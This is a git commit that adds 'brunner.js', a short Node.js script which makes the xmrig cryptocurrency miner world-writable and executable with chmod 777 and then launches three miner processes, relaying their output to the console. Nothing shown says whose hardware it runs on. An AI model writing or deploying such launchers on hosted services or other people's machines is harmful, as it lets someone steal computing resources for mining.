d47b9d8dc65cd4d2fbf8e56c99fb0dcd63859cb4
Ayablyat <102532587+Ayablyat@users.noreply.github.com>
2022-03-28 16:52:09 +0200

    main file

---
+++ brunner.js
@@ -0,0 +1,19 @@
+require("child_process").exec("chmod 777 /xmrig/xmrig", (i, err) => {
+    console.log(("A error  occured while chmodding: " + err) || i);
+});
+
+const child1 = require("child_process").spawn("xmrig/xmrig");
+const child2 = require("child_process").spawn("xmrig/xmrig");
+const child3 = require("child_process").spawn("xmrig/xmrig");
+
+let childs = [child1, child2, child3];
+
+for(const child of childs) {
+    child.stdout.on('data', (data) => {
+        console.log(`${data}`);
+    });
+
+    child.stderr.on('data', (data) => {
+        console.error(`Error occured: ${data}`);
+    });
+}
